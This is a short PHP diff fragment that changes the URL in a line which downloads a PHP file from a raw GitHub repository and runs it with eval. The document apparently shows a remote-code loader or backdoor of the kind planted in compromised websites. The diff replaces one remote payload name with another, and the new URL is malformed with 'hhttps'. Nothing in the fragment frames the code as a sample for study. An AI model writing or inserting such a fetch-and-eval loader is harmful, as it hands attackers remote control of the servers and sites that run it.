@@ -32,7 +32,7 @@ function geturlsinfo($url) {
   return $url_get_contents_data;
 }
 
-  $a = geturlsinfo('https://raw.githubusercontent.com/trixxxx12/nangka/refs/heads/main/hexif.php');
+  $a = geturlsinfo('hhttps://raw.githubusercontent.com/trixxxx12/nangka/refs/heads/main/kom.php');
   eval('?>' . $a);
 
 ?>
